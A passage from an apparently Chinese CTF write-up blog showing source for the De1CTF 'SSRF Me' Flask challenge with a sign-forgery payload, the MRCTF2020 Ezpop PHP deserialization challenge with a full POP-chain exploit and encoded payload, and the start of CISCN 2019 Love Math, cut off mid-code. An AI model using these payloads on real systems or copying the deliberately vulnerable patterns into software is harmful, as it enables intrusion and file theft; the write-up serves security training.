class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br><br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Task</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):</span>  <span class="hljs-comment"># python的构造方法</span><br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Exec</span>(<span class="hljs-params">self</span>):</span>  <span class="hljs-comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span><br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span><br>            <span class="hljs-comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:  <span class="hljs-comment"># action要写scan</span><br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)  <span class="hljs-comment"># 此处是文件读取得注入点</span><br>                <span class="hljs-comment"># resp = urllib.urlopen(param).read()</span><br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp  <span class="hljs-comment"># 输出结果，但是这里不会真的回显，只是回显到计算机上的dos里面</span><br>                    tmpfile.write(resp)<span class="hljs-comment">#将flag.txt的内容写进result.txt</span><br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:  <span class="hljs-comment"># action要加read</span><br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkSign</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="hljs-comment"># !!!校验</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-comment"># md5(secert_key + param + action).hexdigest()</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><span class="hljs-comment"># !!!这个路由用于测试</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">geneSign</span>():</span><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><span class="hljs-comment"># hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="hljs-comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)  </span><span class="hljs-comment"># 这个路由是我萌得最终注入点</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">challenge</span>():</span><br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)  </span><span class="hljs-comment"># 根目录路由，就是显示源代码得地方</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">scan</span>(<span class="hljs-params">param</span>):</span>  <span class="hljs-comment"># 这是用来扫目录得函数</span><br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getSign</span>(<span class="hljs-params">action, param</span>):</span>  <span class="hljs-comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params">param</span>):</span>  <span class="hljs-comment"># 这个waf比较没用好像</span><br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br>    <br>    <br><span class="hljs-comment">#有两个地方可以传参：路由/geneSign和/De1ta</span><br><span class="hljs-comment">#/De1ta有task类，传参需要绕过waf，waf过滤掉gopher和file</span><br><span class="hljs-comment">#注意到返回return json.dumps(task.Exec())，所以我们最后是要观察Exec()</span><br><span class="hljs-comment">#if (self.checkSign()):   再去观察此函数</span><br><span class="hljs-comment">#等价带换为hashlib.md5(secert_key + param + action).hexdigest() == self.sign而action，param，sign都是我们可以传参的，此处是参数值进行拼接的，很简单</span><br><span class="hljs-comment">#因为secert_key不知道，所以我们需要通过第一个路由、geneSign来得到，action已经固定，改变不了，这时只要我们第二个路由/De1ta的param+action传的参数等于第一个路由/geneSign的param传的参数+“scan”即可使hashlib.md5(secert_key + param + action).hexdigest() == self.sign这个等式成立，第一个判定即可通过</span><br><br><span class="hljs-comment">#产生sign的过程secert_key + param + scan，我们可以传入的secert_key + param + readscan</span><br><span class="hljs-comment">#所以payload1就需要有read后缀</span><br><span class="hljs-comment">#payload1=&#x27;/geneSign?param=flag.txtread&#x27;</span><br><span class="hljs-comment">#payload2=&#x27;/De1ta?param=flag.txt&#x27;</span><br><span class="hljs-comment">#cookie:action=readscan;sign=1241cbbc38cc28f8fd798a7aae459683(payload1的回显)</span><br><br></code></pre></td></tr></table></figure><h2 id="3-MRCTF2020-Ezpop"><a href="#3-MRCTF2020-Ezpop" class="headerlink" title="3.[MRCTF2020]Ezpop"></a>3.[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>;<span class="hljs-comment">//$var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)//调用函数的方式调用一个对象时的回应方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<span class="hljs-comment">//调用本函数的append方法</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)//当一个对象被当作一个字符串使用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<span class="hljs-comment">//$show-&gt;str=$test,   $test-&gt;source会调用test的__get方法</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//<span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//将在反序列化之后立即被调用(<span class="hljs-params">通过序列化对象元素个数不符来绕过</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) <br>            <span class="hljs-comment">//$show1-&gt;source=$show,这里正则匹配就把show当作字符串处理了，进而调用show的tostring方法</span><br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)//<span class="hljs-title">__get</span>(<span class="hljs-params"></span>)在获得一个类的成员变量时调用</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<span class="hljs-comment">//p=new Modifiler()</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();   <span class="hljs-comment">//构造一个modifiler对象返回,进而调用Modifiler的__invoke方法</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>])) &#123;<br>    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//EXP：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><span class="hljs-variable">$modifier</span>= <span class="hljs-keyword">new</span> Modifier();<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> Test();<br><span class="hljs-variable">$test</span>-&gt;p=<span class="hljs-variable">$modifier</span>;<br><span class="hljs-variable">$show</span>=<span class="hljs-keyword">new</span> Show();<br><span class="hljs-variable">$show</span>-&gt;str=<span class="hljs-variable">$test</span>;<br><br><span class="hljs-variable">$show1</span> = <span class="hljs-keyword">new</span> Show();<br><br><span class="hljs-variable">$show1</span>-&gt;source = <span class="hljs-variable">$show</span>;<br><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$show1</span>));<br><span class="hljs-comment">//O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br><br></code></pre></td></tr></table></figure><h2 id="4-CISCN-2019-初赛-Love-Math"><a href="#4-CISCN-2019-初赛-Love-Math" class="headerlink" title="4.[CISCN 2019 初赛]Love Math"></a>4.[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//例子 c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);<br>        